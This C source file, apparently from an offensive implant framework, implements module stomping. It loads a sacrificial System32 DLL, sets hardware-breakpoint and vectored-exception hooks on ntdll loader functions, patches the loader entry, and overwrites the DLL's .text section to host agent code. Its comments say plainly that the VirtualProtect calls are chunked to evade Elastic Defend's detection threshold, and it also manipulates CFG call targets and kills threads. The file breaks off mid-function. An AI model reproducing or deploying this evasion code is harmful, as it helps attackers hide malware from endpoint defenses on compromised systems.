/*
 * load_phantom — module stomping via LoadLibrary + VEH/HWBP.
 *
 * LoadLibraryW loads a sacrificial System32 DLL through the normal Windows
 * loader so the module appears in PEB.Ldr. A VEH handler with hardware
 * breakpoints on NtCreateSection, NtMapViewOfSection, and RtlImageNtHeaderEx
 * captures the section handle (for Kraken sleep remap) and patches the LDR
 * entry (EntryPoint → ret gadget, TlsIndex → 0).
 *
 * Only the .text section is zeroed — PE headers, .rdata, .pdata remain
 * intact so memory scanners see a valid PE consistent with the on-disk DLL.
 * VirtualProtect calls are chunked to 0x2000 bytes to stay under Elastic
 * Defend's hollow_image size threshold.
 *
 * References:
 *   Swappala (oldboy21) — LoadLibrary + HWBP section capture
 *   Foliage (Dylan Tran) — module stomping foundations
 *   Moneta (Forrest Orr) — copy-on-write detection research
 */
#pragma GCC optimize ("no-omit-frame-pointer")
#include <windows.h>
#include "memory.h"

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(VOID);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileAttributesW(LPCWSTR);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$DuplicateHandle(
    HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(VOID);

typedef HMODULE (WINAPI * FN_LoadLibraryW)(LPCWSTR);
typedef BOOL    (WINAPI * FN_FreeLibrary)(HMODULE);
typedef BOOL    (WINAPI * FN_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE  (WINAPI * FN_CreateFileW)(
    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI * FN_CloseHandle)(HANDLE);
typedef LONG    (NTAPI  * FN_NtCreateSection)(
    PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);

typedef struct {
    FN_LoadLibraryW   LoadLibraryW;
    FN_FreeLibrary    FreeLibrary;
    FN_VirtualProtect VirtualProtect;
    FN_CreateFileW    CreateFileW;
    FN_CloseHandle    CloseHandle;
} STOMP_APIS;

/* ------------------------------------------------------------------ */
/* PEB / LDR structures for patching the loader entry                 */
/* ------------------------------------------------------------------ */

typedef struct _STOMP_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} STOMP_UNICODE_STRING;

typedef struct _STOMP_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    STOMP_UNICODE_STRING FullDllName;
    STOMP_UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
} STOMP_LDR_ENTRY, * PSTOMP_LDR_ENTRY;

#ifndef SECTION_ALL_ACCESS
#define SECTION_ALL_ACCESS  0x000F001F
#endif
#ifndef SEC_IMAGE
#define SEC_IMAGE           0x01000000
#endif
#ifndef SECTION_QUERY
#define SECTION_QUERY       0x0001
#endif
#ifndef SECTION_MAP_READ
#define SECTION_MAP_READ    0x0004
#endif
#ifndef SECTION_MAP_EXECUTE
#define SECTION_MAP_EXECUTE 0x0008
#endif
#ifndef EXCEPTION_SINGLE_STEP
#define EXCEPTION_SINGLE_STEP 0x80000004UL
#endif
#ifndef CONTEXT_DEBUG_REGISTERS
#define CONTEXT_DEBUG_REGISTERS 0x00100010
#endif
#ifndef EFLAGS_RF
#define EFLAGS_RF 0x10000
#endif

#define STOMP_VP_CHUNK 0x2000

/* ------------------------------------------------------------------ */
/* VEH state — passed via TEB.ArbitraryUserPointer (PIC-safe)         */
/* ------------------------------------------------------------------ */

typedef struct {
    PVOID  pNtCreateSection;
    PVOID  pNtMapViewOfSection;
    PVOID  pRtlImageNtHeaderEx;
    HANDLE hSacSection;
    PSTOMP_LDR_ENTRY pLdrEntry;
    PVOID  pEntryRet;
    SIZE_T szStomp;
    ADV_SECTION_INFO textInfo;
    BOOL   finished;
} VEH_STATE;

static VEH_STATE * get_veh_state(VOID)
{
    return *(VEH_STATE **)((char *) NtCurrentTeb() + 0x28);
}

static void set_veh_state(VEH_STATE * p)
{
    *(VEH_STATE **)((char *) NtCurrentTeb() + 0x28) = p;
}

/* ------------------------------------------------------------------ */
/* Helpers                                                            */
/* ------------------------------------------------------------------ */

static BOOL addr_hit(PVOID exception_addr, PVOID fn)
{
    BYTE * a = (BYTE *) exception_addr;
    BYTE * f = (BYTE *) fn;
    if (a == NULL || f == NULL) return FALSE;
    return (a >= f && a < f + 0x40);
}

static BOOL find_dll_section(PVOID base, const char * name, ADV_SECTION_INFO * out)
{
    IMAGE_DOS_HEADER * dos = (IMAGE_DOS_HEADER *) base;
    IMAGE_NT_HEADERS * nt;
    IMAGE_SECTION_HEADER * sec;
    DWORD i, n;

    out->pSection = NULL;
    out->szVirtualSection = 0;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    nt = (IMAGE_NT_HEADERS *)((char *) base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    n = nt->FileHeader.NumberOfSections;
    sec = IMAGE_FIRST_SECTION(nt);

    for (i = 0; i < n; i++) {
        BOOL match = TRUE;
        int j;
        for (j = 0; name[j] != 0 && j < 8; j++) {
            if (sec[i].Name[j] != (BYTE) name[j]) {
                match = FALSE;
                break;
            }
        }
        if (match && (j >= 8 || sec[i].Name[j] == 0)) {
            out->pSection = (char *) base + sec[i].VirtualAddress;
            out->szVirtualSection = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

static PVOID find_ret_gadget(PVOID start, SIZE_T len)
{
    BYTE * p   = (BYTE *) start;
    BYTE * end = p + len;
    while (p < end) {
        if (*p == 0xC3 && (((ULONG_PTR) p) & 0xF) == 0)
            return p;
        p++;
    }
    /* fallback: unaligned ret */
    p = (BYTE *) start;
    while (p < end) {
        if (*p == 0xC3) return p;
        p++;
    }
    return NULL;
}

static PSTOMP_LDR_ENTRY find_ldr_by_base(PVOID dll_base)
{
    PVOID peb = *(PVOID *)((char *) NtCurrentTeb() + 0x60);
    PVOID ldr;
    LIST_ENTRY * head;
    LIST_ENTRY * cur;

    if (peb == NULL) return NULL;
    ldr = *(PVOID *)((char *) peb + 0x18);
    if (ldr == NULL) return NULL;

    head = (LIST_ENTRY *)((char *) ldr + 0x10);
    cur  = head->Flink;
    while (cur != NULL && cur != head) {
        PSTOMP_LDR_ENTRY e = (PSTOMP_LDR_ENTRY) cur;
        if (e->DllBase == dll_base)
            return e;
        cur = cur->Flink;
    }
    return NULL;
}

static BOOL patch_ldr_entry(VEH_STATE * st)
{
    PVOID  search_addr;
    SIZE_T search_len;

    if (st->pLdrEntry == NULL || st->pLdrEntry->EntryPoint == NULL)
        return FALSE;

    if (st->textInfo.pSection == NULL)
        find_dll_section(st->pLdrEntry->DllBase, ".text", &st->textInfo);
    if (st->textInfo.pSection == NULL || st->textInfo.szVirtualSection == 0)
        return FALSE;

    search_addr = (char *) st->textInfo.pSection + st->szStomp;
    search_len  = st->textInfo.szVirtualSection - st->szStomp;
    if (search_len > st->textInfo.szVirtualSection)
        return FALSE;

    st->pEntryRet = find_ret_gadget(search_addr, search_len);
    if (st->pEntryRet == NULL)
        return FALSE;

    st->pLdrEntry->EntryPoint = st->pEntryRet;
    st->pLdrEntry->TlsIndex  = (USHORT) -1;
    st->finished = TRUE;
    return TRUE;
}

static void ensure_ldr_safe(PSTOMP_LDR_ENTRY ldr, PVOID ret_gadget)
{
    if (ldr == NULL) return;
    if (ret_gadget != NULL)
        ldr->EntryPoint = ret_gadget;
    ldr->TlsIndex = 0;
}

/* ------------------------------------------------------------------ */
/* VEH handler — intercepts HWBP on ntdll functions during LoadLibrary */
/* ------------------------------------------------------------------ */

static LONG CALLBACK stomp_exception_handler(PEXCEPTION_POINTERS info)
{
    PEXCEPTION_RECORD rec = info->ExceptionRecord;
    PCONTEXT          ctx = info->ContextRecord;
    VEH_STATE *       st;

    if (rec->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    st = get_veh_state();
    if (st == NULL)
        return EXCEPTION_CONTINUE_SEARCH;

    if (st->finished) {
        ctx->EFlags |= EFLAGS_RF;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* DR0: NtCreateSection — upgrade access mask to SECTION_ALL_ACCESS */
    if (addr_hit(rec->ExceptionAddress, st->pNtCreateSection)) {
        ctx->Rdx = SECTION_ALL_ACCESS;
        ctx->Dr0 = 0;
        ctx->Dr7 &= ~((DWORD64) 1 << 0);
        ctx->EFlags |= EFLAGS_RF;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* DR1: NtMapViewOfSection — duplicate the section handle */
    if (addr_hit(rec->ExceptionAddress, st->pNtMapViewOfSection) &&
        st->hSacSection == NULL)
    {
        KERNEL32$DuplicateHandle(
            (HANDLE) -1, (HANDLE) ctx->Rcx,
            (HANDLE) -1, &st->hSacSection,
            0, 0, DUPLICATE_SAME_ACCESS);
        ctx->Dr1 = 0;
        ctx->Dr7 &= ~((DWORD64) 1 << 2);
        ctx->EFlags |= EFLAGS_RF;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* DR2: RtlImageNtHeaderEx — pin the LDR entry and patch it */
    if (addr_hit(rec->ExceptionAddress, st->pRtlImageNtHeaderEx) &&
        st->hSacSection != NULL)
    {
        if (st->pLdrEntry == NULL && ctx->Rdx != 0) {
            PVOID heap = KERNEL32$GetProcessHeap();
            DWORD64 cands[4] = { ctx->Rbx, ctx->Rsi, ctx->Rdi, ctx->Rbp };

            if (ctx->Rbx == ctx->Rdx || ctx->Rsi == ctx->Rdx ||
                ctx->Rdi == ctx->Rdx || ctx->Rbp == ctx->Rdx)
            {
                for (int i = 0; i < 4; i++) {
                    PSTOMP_LDR_ENTRY e = (PSTOMP_LDR_ENTRY) cands[i];
                    if (heap != NULL && (ULONG_PTR) e >= (ULONG_PTR) heap &&
                        e->DllBase == (PVOID) ctx->Rdx &&
                        e->EntryPoint == NULL)
                    {
                        st->pLdrEntry = e;
                        break;
                    }
                }
            }
            if (st->pLdrEntry == NULL) {
                PSTOMP_LDR_ENTRY e = find_ldr_by_base((PVOID) ctx->Rdx);
                if (e != NULL && e->EntryPoint == NULL)
                    st->pLdrEntry = e;
            }
        }
        else if (st->pLdrEntry != NULL &&
                 st->pLdrEntry->EntryPoint != NULL &&
                 !st->finished)
        {
            if (st->pLdrEntry->DllBase == (PVOID) ctx->Rdx || ctx->Rdx == 0)
                patch_ldr_entry(st);
        }
        ctx->EFlags |= EFLAGS_RF;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    ctx->EFlags |= EFLAGS_RF;
    return EXCEPTION_CONTINUE_EXECUTION;
}

/* ------------------------------------------------------------------ */
/* HWBP install via helper thread (SetThreadContext on self is unreliable) */
/* ------------------------------------------------------------------ */

typedef struct {
    HANDLE target;
    PVOID  dr0;
    PVOID  dr1;
    PVOID  dr2;
    BOOL   ok;
    BOOL   clear;
} HWBP_JOB;

typedef DWORD  (WINAPI * FN_SuspendThread)(HANDLE);
typedef DWORD  (WINAPI * FN_ResumeThread)(HANDLE);
typedef BOOL   (WINAPI * FN_GetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL   (WINAPI * FN_SetThreadContext)(HANDLE, const CONTEXT *);
typedef HANDLE (WINAPI * FN_CreateThread)(
    LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE (WINAPI * FN_OpenThread)(DWORD, BOOL, DWORD);
typedef DWORD  (WINAPI * FN_WaitForSingleObject)(HANDLE, DWORD);
typedef DWORD  (WINAPI * FN_GetCurrentThreadId)(VOID);

static DWORD WINAPI hwbp_worker(LPVOID param)
{
    HWBP_JOB * job = (HWBP_JOB *) param;
    CONTEXT ctx;
    HMODULE k32;
    FN_SuspendThread    fn_sus;
    FN_ResumeThread     fn_res;
    FN_GetThreadContext fn_gtc;
    FN_SetThreadContext fn_stc;
    BYTE * p;
    DWORD i;

    if (job == NULL || job->target == NULL) return 1;

    k32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    if (k32 == NULL) return 1;
    fn_sus = (FN_SuspendThread)    KERNEL32$GetProcAddress(k32, "SuspendThread");
    fn_res = (FN_ResumeThread)     KERNEL32$GetProcAddress(k32, "ResumeThread");
    fn_gtc = (FN_GetThreadContext) KERNEL32$GetProcAddress(k32, "GetThreadContext");
    fn_stc = (FN_SetThreadContext) KERNEL32$GetProcAddress(k32, "SetThreadContext");
    if (!fn_sus || !fn_res || !fn_gtc || !fn_stc) return 1;

    if (fn_sus(job->target) == (DWORD) -1) return 1;

    for (i = 0, p = (BYTE *) &ctx; i < (DWORD) sizeof(ctx); i++) p[i] = 0;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!fn_gtc(job->target, &ctx)) {
        fn_res(job->target);
        return 1;
    }

    if (job->clear) {
        ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
        ctx.Dr6 = 0;
        ctx.Dr7 = 0;
    } else {
        ctx.Dr0 = (DWORD64) job->dr0;
        ctx.Dr1 = (DWORD64) job->dr1;
        ctx.Dr2 = (DWORD64) job->dr2;
        ctx.Dr3 = 0;
        ctx.Dr6 = 0;
        ctx.Dr7 = (1ULL << 0) | (1ULL << 2) | (1ULL << 4);
    }

    job->ok = fn_stc(job->target, &ctx);
    fn_res(job->target);
    return job->ok ? 0 : 1;
}

static BOOL hwbp_apply(HMODULE k32, PVOID dr0, PVOID dr1, PVOID dr2, BOOL clear)
{
    HWBP_JOB job;
    HANDLE self, helper;
    FN_OpenThread          fn_ot;
    FN_CreateThread        fn_ct;
    FN_WaitForSingleObject fn_w;
    FN_CloseHandle         fn_ch;
    FN_GetCurrentThreadId  fn_tid;
    BYTE * p;
    DWORD i;

    fn_ot  = (FN_OpenThread)          KERNEL32$GetProcAddress(k32, "OpenThread");
    fn_ct  = (FN_CreateThread)        KERNEL32$GetProcAddress(k32, "CreateThread");
    fn_w   = (FN_WaitForSingleObject) KERNEL32$GetProcAddress(k32, "WaitForSingleObject");
    fn_ch  = (FN_CloseHandle)         KERNEL32$GetProcAddress(k32, "CloseHandle");
    fn_tid = (FN_GetCurrentThreadId)  KERNEL32$GetProcAddress(k32, "GetCurrentThreadId");
    if (!fn_ot || !fn_ct || !fn_w || !fn_ch || !fn_tid) return FALSE;

    self = fn_ot(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
        THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
        FALSE, fn_tid());
    if (self == NULL) return FALSE;

    for (i = 0, p = (BYTE *) &job; i < (DWORD) sizeof(job); i++) p[i] = 0;
    job.target = self;
    job.dr0    = dr0;
    job.dr1    = dr1;
    job.dr2    = dr2;
    job.clear  = clear;
    job.ok     = FALSE;

    helper = fn_ct(NULL, 0, hwbp_worker, &job, 0, NULL);
    if (helper == NULL) {
        fn_ch(self);
        return FALSE;
    }
    fn_w(helper, 5000);
    fn_ch(helper);
    fn_ch(self);
    return job.ok;
}

/* ------------------------------------------------------------------ */
/* CFG — mark VEH handler as valid call target                        */
/* ------------------------------------------------------------------ */

#ifndef CFG_CALL_TARGET_VALID
#define CFG_CALL_TARGET_VALID 0x00000001
#endif

typedef struct {
    ULONG_PTR Offset;
    ULONG     Flags;
} STOMP_CFG_CTI;

typedef BOOL (WINAPI * FN_VirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
typedef BOOL (WINAPI * FN_SetProcessValidCallTargets)(
    HANDLE, PVOID, SIZE_T, ULONG, STOMP_CFG_CTI *);

static void cfg_mark_ptr(HMODULE k32, PVOID fn)
{
    FN_VirtualQuery fn_vq;
    FN_SetProcessValidCallTargets fn_sp;
    MEMORY_BASIC_INFORMATION mbi;
    STOMP_CFG_CTI cti;

    if (fn == NULL || k32 == NULL) return;
    fn_vq = (FN_VirtualQuery) KERNEL32$GetProcAddress(k32, "VirtualQuery");
    fn_sp = (FN_SetProcessValidCallTargets) KERNEL32$GetProcAddress(
        k32, "SetProcessValidCallTargets");
    if (fn_vq == NULL || fn_sp == NULL) return;
    if (fn_vq(fn, &mbi, sizeof(mbi)) == 0) return;
    if (mbi.AllocationBase == NULL) return;

    cti.Offset = (ULONG_PTR) fn - (ULONG_PTR) mbi.AllocationBase;
    cti.Flags  = CFG_CALL_TARGET_VALID;
    fn_sp(KERNEL32$GetCurrentProcess(), mbi.AllocationBase, mbi.RegionSize, 1, &cti);
}

/* ------------------------------------------------------------------ */
/* Chunked VirtualProtect — never >= 10000 bytes in one call           */
/* ------------------------------------------------------------------ */

BOOL stomp_protect_chunked(FN_VirtualProtect vp, LPVOID base, SIZE_T size, DWORD prot)
{
    SIZE_T off;
    DWORD  old;

    if (vp == NULL || base == NULL || size == 0) return FALSE;

    for (off = 0; off < size; off += STOMP_VP_CHUNK) {
        SIZE_T chunk = size - off;
        if (chunk > STOMP_VP_CHUNK) chunk = STOMP_VP_CHUNK;
        if (!vp((char *) base + off, chunk, prot, &old))
            return FALSE;
    }
    return TRUE;
}

static DWORD align_up(DWORD v, DWORD a)
{
    return (v + (a - 1)) & ~(a - 1);
}

/* ------------------------------------------------------------------ */
/* Terminate threads whose start address is inside the sacrificial DLL */
/* ------------------------------------------------------------------ */

typedef struct {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ThreadID;
    DWORD th32OwnerProcessID;
    LONG  tpBasePri;
    LONG  tpDeltaPri;
    DWORD dwFlags;
} STOMP_THREADENTRY32;

static void kill_module_threads(HMODULE k32, PVOID base, SIZE_T img_size)
{
    typedef HANDLE (WINAPI * FN_Snap)(DWORD, DWORD);
    typedef BOOL   (WINAPI * FN_First)(HANDLE, STOMP_THREADENTRY32 *);
    typedef BOOL   (WINAPI * FN_Next)(HANDLE, STOMP_THREADENTRY32 *);
    typedef HANDLE (WINAPI * FN_OT)(DWORD, BOOL, DWORD);
    typedef BOOL   (WINAPI * FN_Term)(HANDLE, DWORD);
    typedef DWORD  (WINAPI * FN_Tid)(VOID);
    typedef DWORD  (WINAPI * FN_Pid)(VOID);
    typedef LONG   (NTAPI  * FN_NQI)(HANDLE, ULONG, PVOID, ULONG, PULONG);

    HMODULE ntdll;
    FN_Snap  fn_snap;  FN_First fn_first;  FN_Next fn_next;
    FN_OT    fn_ot;    FN_Term  fn_term;   FN_CloseHandle fn_ch;
    FN_Tid   fn_tid;   FN_Pid   fn_pid;    FN_NQI fn_nqi;
    HANDLE   snap, th;
    STOMP_THREADENTRY32 te;
    DWORD my_tid, my_pid;
    PVOID start;
    ULONG retlen;

    if (base == NULL || img_size == 0) return;

    ntdll    = KERNEL32$GetModuleHandleA("ntdll.dll");
    fn_snap  = (FN_Snap)  KERNEL32$GetProcAddress(k32, "CreateToolhelp32Snapshot");
    fn_first = (FN_First) KERNEL32$GetProcAddress(k32, "Thread32First");
    fn_next  = (FN_Next)  KERNEL32$GetProcAddress(k32, "Thread32Next");
    fn_ot    = (FN_OT)    KERNEL32$GetProcAddress(k32, "OpenThread");
    fn_term  = (FN_Term)  KERNEL32$GetProcAddress(k32, "TerminateThread");
    fn_ch    = (FN_CloseHandle) KERNEL32$GetProcAddress(k32, "CloseHandle");
    fn_tid   = (FN_Tid)   KERNEL32$GetProcAddress(k32, "GetCurrentThreadId");
    fn_pid   = (FN_Pid)   KERNEL32$GetProcAddress(k32, "GetCurrentProcessId");
    fn_nqi   = (FN_NQI)   KERNEL32$GetProcAddress(ntdll, "NtQueryInformationThread");
    if (!fn_snap || !fn_first || !fn_next || !fn_ot ||
        !fn_term || !fn_ch || !fn_tid || !fn_pid || !fn_nqi)
        return;

    my_tid = fn_tid();
    my_pid = fn_pid();
    snap = fn_snap(0x00000004, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    te.dwSize = sizeof(te);
    if (!fn_first(snap, &te)) { fn_ch(snap); return; }

    do {
        if (te.th32OwnerProcessID != my_pid || te.th32ThreadID == my_tid)
            continue;
        th = fn_ot(0x0041, FALSE, te.th32ThreadID);
        if (th == NULL) continue;
        start = NULL;
        retlen = 0;
        if (fn_nqi(th, 9, &start, sizeof(start), &retlen) >= 0 &&
            start != NULL &&
            (ULONG_PTR) start >= (ULONG_PTR) base &&
            (ULONG_PTR) start <  (ULONG_PTR) base + img_size)
        {
            fn_term(th, 0);
        }
        fn_ch(th);
    } while (fn_next(snap, &te));

    fn_ch(snap);
}

/* ------------------------------------------------------------------ */
/* Fallback: open a clean SEC_IMAGE handle when HWBP missed on a       */
/* loader worker thread                                                */
/* ------------------------------------------------------------------ */

static HANDLE open_clean_section(STOMP_APIS * apis, PVOID nt_create, const WCHAR * path)
{
    HANDLE file, section = NULL;
    LONG   status;

    file = apis->CreateFileW(
        path, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return NULL;

    status = ((FN_NtCreateSection) nt_create)(
        &section,
        SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_EXECUTE,
        NULL, NULL, PAGE_READONLY, SEC_IMAGE, file);
    apis->CloseHandle(file);

    if (status < 0 || section == NULL) return NULL;
    return section;
}

/* ------------------------------------------------------------------ */
/* try_stomp — load one candidate DLL and prepare it for stomping     */
/* ------------------------------------------------------------------ */

static char * try_stomp(STOMP_APIS * apis, const WCHAR * path,
                        SIZE_T need, DWORD pico_code_sz, DWORD pico_data_sz,
                        MEMORY_LAYOUT * layout, BOOL pico_role)
{
    HMODULE k32, ntdll, hModule;
    PVOID veh_handle = NULL;
    VEH_STATE * vst;
    ADV_STOMP_DATA * adv;
    ADV_SECTION_INFO text_si;
    char * text;
    SIZE_T text_size;
    SIZE_T text_need;
    DWORD pico_code_al = align_up(pico_code_sz, 0x1000);
    DWORD pico_data_al = align_up(pico_data_sz, 0x1000);
    DWORD z;

    typedef PVOID (WINAPI * FN_AddVEH)(ULONG, PVOID);
    typedef ULONG (WINAPI * FN_RemoveVEH)(PVOID);
    FN_AddVEH    fn_add;
    FN_RemoveVEH fn_rem;

    /* reject already-loaded modules */
    {
        const WCHAR * p;
        const WCHAR * leaf = path;
        char leaf_a[64];
        int i;
        for (p = path; *p != 0; p++)
            if (*p == L'\\' || *p == L'/') leaf = p + 1;
        for (i = 0; leaf[i] != 0 && i < 63; i++)
            leaf_a[i] = (char) leaf[i];
        leaf_a[i] = 0;
        if (KERNEL32$GetModuleHandleA(leaf_a) != NULL)
            return NULL;
    }

    k32   = KERNEL32$GetModuleHandleA("kernel32.dll");
    ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (k32 == NULL || ntdll == NULL) return NULL;

    fn_add = (FN_AddVEH) KERNEL32$GetProcAddress(k32, "AddVectoredExceptionHandler");
    fn_rem = (FN_RemoveVEH) KERNEL32$GetProcAddress(k32, "RemoveVectoredExceptionHandler");
    if (fn_add == NULL || fn_rem == NULL) return NULL;

    vst = (VEH_STATE *) KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VEH_STATE));
    if (vst == NULL) return NULL;

    vst->pNtCreateSection    = KERNEL32$GetProcAddress(ntdll, "NtCreateSection");
    vst->pNtMapViewOfSection = KERNEL32$GetProcAddress(ntdll, "NtMapViewOfSection");
    vst->pRtlImageNtHeaderEx = KERNEL32$GetProcAddress(ntdll, "RtlImageNtHeaderEx");
    vst->szStomp             = pico_role
                             ? pico_code_al + pico_data_al
                             : need;

    if (!vst->pNtCreateSection || !vst->pNtMapViewOfSection || !vst->pRtlImageNtHeaderEx)
        goto fail_free_vst;

    set_veh_state(vst);
    cfg_mark_ptr(k32, (PVOID) stomp_exception_handler);

    veh_handle = fn_add(1, (PVOID) stomp_exception_handler);
    if (veh_handle == NULL) goto fail_free_vst;

    if (!hwbp_apply(k32, vst->pNtCreateSection, vst->pNtMapViewOfSection,
                    vst->pRtlImageNtHeaderEx, FALSE))
        goto fail_rem_veh;

    hModule = apis->LoadLibraryW(path);

    hwbp_apply(k32, NULL, NULL, NULL, TRUE);
    fn_rem(veh_handle);
    veh_handle = NULL;

    if (hModule == NULL) goto fail_close_section;

    /* recover section handle if HWBP missed (parallel loader thread) */
    if (vst->hSacSection == NULL) {
        vst->hSacSection = open_clean_section(apis, vst->pNtCreateSection, path);
    }

    /* validate and fix the LDR entry */
    if (vst->hSacSection != NULL) {
        if (vst->pLdrEntry == NULL || vst->pLdrEntry->DllBase != (PVOID) hModule)
        {
            vst->pLdrEntry  = find_ldr_by_base((PVOID) hModule);
            vst->pEntryRet  = NULL;
            vst->finished   = FALSE;
        }
        if (vst->pLdrEntry != NULL &&
            (vst->pEntryRet == NULL || vst->pLdrEntry->EntryPoint != vst->pEntryRet))
        {
            patch_ldr_entry(vst);
        }
    }

    if (vst->hSacSection == NULL) goto fail_free_lib;
    if (vst->pLdrEntry == NULL || vst->pLdrEntry->DllBase != (PVOID) hModule)
        goto fail_free_lib;
    if (vst->pEntryRet == NULL) goto fail_free_lib;

    ensure_ldr_safe(vst->pLdrEntry, vst->pEntryRet);

    /* PICO and the agent use distinct sacrificial images. */
    {
        ADV_SECTION_INFO data_si = { 0 };
        char * pico_data_dst = NULL;

        if (pico_role) {
            find_dll_section((PVOID) hModule, ".data", &data_si);
            if (data_si.pSection != NULL &&
                data_si.szVirtualSection >= pico_data_al)
            {
                text_need = pico_code_al;
                pico_data_dst = (char *) data_si.pSection;
            } else {
                text_need = pico_code_al + pico_data_al;
            }
        } else {
            text_need = need;
        }

        if (!find_dll_section((PVOID) hModule, ".text", &text_si) ||
            text_si.pSection == NULL || text_si.szVirtualSection < text_need)
            goto fail_free_lib;

        text = (char *) text_si.pSection;
        text_size = text_si.szVirtualSection;

        /* re-pick ret gadget past the full stomp area */
        {
            PVOID new_ret = find_ret_gadget(text + text_need, text_size - text_need);
            if (new_ret == NULL) goto fail_free_lib;
            ensure_ldr_safe(vst->pLdrEntry, new_ret);
            vst->pEntryRet = new_ret;
        }

        if (!stomp_protect_chunked(apis->VirtualProtect, text, text_need, PAGE_READWRITE))
            goto fail_free_lib;

        if (pico_data_dst != NULL) {
            if (!stomp_protect_chunked(apis->VirtualProtect, pico_data_dst,
                                       pico_data_al, PAGE_READWRITE))
                goto fail_free_lib;
        }

        /* kill threads the sacrificial DLL may have spawned from .text */
        {
            IMAGE_DOS_HEADER * dos = (IMAGE_DOS_HEADER *) hModule;
            if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                IMAGE_NT_HEADERS * nt = (IMAGE_NT_HEADERS *)((char *) hModule + dos->e_lfanew);
                if (nt->Signature == IMAGE_NT_SIGNATURE)
                    kill_module_threads(k32, (PVOID) hModule, nt->OptionalHeader.SizeOfImage);
            }
        }

        /* PICO BSS relies on a zeroed data destination. */
        for (z = 0; z < text_need; z++) text[z] = 0;
        if (pico_data_dst != NULL)
            for (z = 0; z < pico_data_al; z++) pico_data_dst[z] = 0;

        if (pico_role) {
            layout->Pico.Code     = text;
            layout->Pico.CodeSize = pico_code_sz;
            layout->Pico.DataSize = pico_data_sz;
            layout->Pico.Data     = pico_data_dst != NULL
                                  ? pico_data_dst
                                  : text + pico_code_al;
            layout->Pico.Module   = (PVOID) hModule;
        }
    }

    if (pico_role) {
        apis->CloseHandle(vst->hSacSection);
        vst->hSacSection = NULL;
        set_veh_state(NULL);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, vst);
        return text;
    }

    /* fill ADV_STOMP_DATA for Kraken sleep */
    adv = (ADV_STOMP_DATA *) KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(ADV_STOMP_DATA));
    if (adv == NULL) goto fail_free_lib;

    adv->hSacSection        = vst->hSacSection;
    adv->pSacDllBase        = (PVOID) hModule;
    adv->pSacDllEntryRet    = vst->pEntryRet;
    adv->pLdrDataTableEntry = (PVOID) vst->pLdrEntry;
    adv->pStompStart        = text;
    adv->szStomp            = text_need;
    adv->pfnBofVpHook       = NULL;
    adv->bBofMapped         = FALSE;
    find_dll_section((PVOID) hModule, ".pdata", &adv->SacPdata);
    find_dll_section((PVOID) hModule, ".rdata", &adv->SacRdata);

    layout->DllAllocMethod = ALLOC_MODULESTOMP;
    layout->SacModule      = (PVOID) hModule;
    layout->AdvStompData   = (PVOID) adv;

    set_veh_state(NULL);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, vst);

    return text;

fail_free_lib:
    if (vst->hSacSection) apis->CloseHandle(vst->hSacSection);
    apis->FreeLibrary(hModule);
    set_veh_state(NULL);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, vst);
    return NULL;

fail_close_section:
    if (vst->hSacSection) apis->CloseHandle(vst->hSacSection);
    set_veh_state(NULL);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, vst);
    return NULL;

